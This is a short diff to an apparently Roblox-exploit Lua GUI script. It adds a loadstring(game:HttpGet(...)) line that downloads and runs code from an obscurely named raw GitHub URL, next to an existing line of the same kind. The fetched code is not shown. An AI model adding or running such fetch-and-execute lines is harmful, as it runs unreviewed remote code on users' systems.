@@ -188,6 +188,10 @@ Tab5:Label("Credits To Gb")
 
 Tab5:Line()
 
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Fe800Vdoa/23WBHK917392826937281/main/23BI2(H0M3)-MBR9868669678528")))()
+
+wait(1)
+
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Fe800Vdoa/23WBHK917392826937281/main/23BI2(H0M3)-ADM9868669678528")))()
 
 --[[
